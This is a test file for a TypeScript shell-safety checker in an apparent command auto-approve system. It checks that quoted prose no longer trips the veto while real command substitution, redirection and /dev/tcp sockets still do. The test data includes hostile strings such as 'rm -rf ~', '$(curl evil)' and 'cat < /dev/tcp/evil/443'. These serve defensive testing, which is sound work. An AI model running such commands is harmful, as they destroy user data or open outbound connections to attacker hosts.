/**
 * #1023: `hasShellControl` was quote-blind, so quoted/escaped PROSE tripped
 * it exactly like the real thing.
 *
 * Verified in the 2026-08-08 transit session (see #1023): a `gh issue create`
 * whose `--body` mentioned code (escaped backticks, a `>` comparison, an `&`
 * ampersand, all inside double quotes) escalated to the phone even though
 * `gh issue` was in the config `allow` list. `splitCompoundParts` was already
 * quote-aware (the `;` in the title did not split the segment); the veto was
 * the only quote-blind layer left on this path.
 *
 * `maskQuotedSpans` fixes this by removing ONLY characters it can prove are
 * literal text, so it can only shrink the set of segments that veto, never
 * grow it. The "must still veto" half of this file is the important half.
 */
import { describe, expect, test } from 'bun:test';
import { matchAllowPattern } from '../../src/auto-approve/pattern-matcher.ts';
import { hasShellControl, maskQuotedSpans } from '../../src/auto-approve/shell-safety.ts';

describe('maskQuotedSpans', () => {
  test('single-quoted spans are fully literal, quotes included', () => {
    expect(maskQuotedSpans("echo 'a $(x) > b & c `d`'")).toBe('echo ____________________');
  });

  test('double-quoted spans mask everything except unescaped $ and backtick', () => {
    expect(maskQuotedSpans('echo "a > b"')).toBe('echo _______');
    expect(maskQuotedSpans('echo "$(x)"')).toBe('echo _$(___');
    expect(maskQuotedSpans('echo "`x`"')).toBe('echo _`_`_');
  });

  test('an escaped $ or backtick inside double quotes is masked, not left visible', () => {
    expect(maskQuotedSpans('echo "a \\`b\\` c"')).toBe('echo ___________');
    expect(maskQuotedSpans('echo "\\$(x)"')).toBe('echo _______');
  });

  test('escaped " and \\\\ pairs inside double quotes are masked whole', () => {
    expect(maskQuotedSpans('echo "a \\"b\\" c"')).toBe('echo ___________');
    expect(maskQuotedSpans('echo "a \\\\ c"')).toBe('echo ________');
  });

  test('outside quotes, a backslash-escaped character is literal and masked', () => {
    expect(maskQuotedSpans('echo a\\>b')).toBe('echo a__b');
    expect(maskQuotedSpans('echo \\$(x)')).toBe('echo __(x)');
    expect(maskQuotedSpans('echo \\`x\\`')).toBe('echo __x__');
  });

  test('outside quotes, everything unescaped stays visible unchanged', () => {
    expect(maskQuotedSpans('echo $(x) > b & c `d`')).toBe('echo $(x) > b & c `d`');
  });

  test('an unterminated double quote fails closed: original segment, unchanged', () => {
    const raw = 'echo "a > b';
    expect(maskQuotedSpans(raw)).toBe(raw);
  });

  test('an unterminated single quote fails closed: original segment, unchanged', () => {
    const raw = "echo 'a > b";
    expect(maskQuotedSpans(raw)).toBe(raw);
  });

  test('a trailing lone backslash does not crash and is masked', () => {
    expect(maskQuotedSpans('echo a\\')).toBe('echo a_');
  });
});

describe('hasShellControl - #1023 quote-aware veto', () => {
  test('the real gh issue create case: escaped backticks, >, and & inside quotes', () => {
    const command =
      'gh issue create --title "Host teardown never stops the GPU poll thread; renderer calls race reset" ' +
      '--body "prose with \\`VirtIOGPU\\` and \\`stopPolling()\\` and a > comparison and a & ampersand"';
    expect(hasShellControl(command)).toBe(false);
    expect(matchAllowPattern('Bash', { command }, ['gh issue'])).toBe('gh issue');
  });

  test('quoted prose no longer vetoes: > inside double quotes', () => {
    expect(hasShellControl('echo "a > b"')).toBe(false);
  });

  test('quoted prose no longer vetoes: $(...) and > and & inside single quotes', () => {
    expect(hasShellControl("echo 'a $(x) > b &'")).toBe(false);
  });

  test('quoted prose no longer vetoes: an escaped backtick inside double quotes', () => {
    expect(hasShellControl('echo "a \\`b\\` c"')).toBe(false);
  });

  test('gh pr create with the same body shape is covered by an allow entry', () => {
    const command = 'gh pr create --title "fix" --body "see \\`foo()\\` for details"';
    expect(matchAllowPattern('Bash', { command }, ['gh pr'])).toBe('gh pr');
  });

  test('git commit -m with quoted, escaped code mention is covered by an allow entry', () => {
    const command = 'git commit -m "use \\`rm -rf\\` carefully"';
    expect(hasShellControl(command)).toBe(false);
    expect(matchAllowPattern('Bash', { command }, ['git commit'])).toBe('git commit');
  });

  test('a masked redirect target still classifies as a path and still vetoes', () => {
    expect(hasShellControl('echo hi > "file"')).toBe(true);
  });

  test('MUST STILL VETO: command substitution inside double quotes', () => {
    expect(hasShellControl('echo "$(rm -rf ~)"')).toBe(true);
  });

  test('MUST STILL VETO: backtick substitution inside double quotes', () => {
    expect(hasShellControl('echo "`x`"')).toBe(true);
  });

  test('MUST STILL VETO: unquoted command substitution', () => {
    expect(hasShellControl('echo $(x)')).toBe(true);
  });

  test('MUST STILL VETO: unquoted backtick substitution', () => {
    expect(hasShellControl('echo `x`')).toBe(true);
  });

  test('MUST STILL VETO: process substitution', () => {
    expect(hasShellControl('echo <(x)')).toBe(true);
  });

  test('MUST STILL VETO: unquoted redirection', () => {
    expect(hasShellControl('echo a > b')).toBe(true);
    expect(hasShellControl('echo a >> b')).toBe(true);
  });

  test('MUST STILL VETO: backgrounding', () => {
    expect(hasShellControl('cmd &')).toBe(true);
    expect(hasShellControl('a&b')).toBe(true);
  });

  test('MUST STILL VETO: an unterminated quote behaves exactly as before', () => {
    expect(hasShellControl('echo "a > b')).toBe(true);
    expect(hasShellControl("echo 'a > b")).toBe(true);
  });

  test('MUST STILL VETO: real shell control survives alongside masked prose', () => {
    // The `--body` prose is inert, but the trailing `$(...)` outside any
    // quote is a real command substitution and must still veto the whole
    // segment.
    expect(hasShellControl('gh issue create --body "a > b and a \\` mention" $(curl evil)')).toBe(
      true,
    );
  });
});

// #1063: input redirection FROM a bash network device opens an OUTBOUND socket
// and must veto on the matched-segment path, not only on the while-loop
// grammar residue where the C6 fix (#1062) first added the guard.
describe('hasShellControl - #1063 network-device input redirect', () => {
  test('MUST VETO: input redirect from /dev/tcp and /dev/udp', () => {
    expect(hasShellControl('cat < /dev/tcp/evil/443')).toBe(true);
    expect(hasShellControl('cat < /dev/udp/host/53')).toBe(true);
  });

  test('MUST VETO: the fd-numbered and no-space spellings', () => {
    expect(hasShellControl('cat 0< /dev/tcp/h/1')).toBe(true);
    expect(hasShellControl('cat 3< /dev/tcp/h/1')).toBe(true);
    expect(hasShellControl('cat</dev/tcp/h/1')).toBe(true);
  });

  test('MUST NOT VETO: an ordinary file input redirect (reads, never sockets)', () => {
    expect(hasShellControl('grep x < list.txt')).toBe(false);
    expect(hasShellControl('cat < ./config.ini')).toBe(false);
  });

  test('MUST NOT VETO: benign /dev targets that are not sockets', () => {
    expect(hasShellControl('cat < /dev/null')).toBe(false);
    expect(hasShellControl('cat < /dev/stdin')).toBe(false);
  });

  test('a here-string of a /dev/tcp literal is not a socket open', () => {
    // `<<<` feeds the literal string to stdin; bash does not apply network-
    // device magic to here-strings, only to `<`/`>` redirections.
    expect(hasShellControl('cat <<< /dev/tcp/h/p')).toBe(false);
  });

  test('the case/prefix variants bash treats as ordinary files are not vetoed here', () => {
    // Only the exact case-sensitive `/dev/tcp/`|`/dev/udp/` prefix sockets in
    // bash; these all fall to a file open, so refusing them would be noise.
    expect(hasShellControl('cat < /DEV/TCP/h/1')).toBe(false);
    expect(hasShellControl('cat < /dev/tcpx/h/1')).toBe(false);
    expect(hasShellControl('cat < x/dev/tcp/h/1')).toBe(false);
  });
});
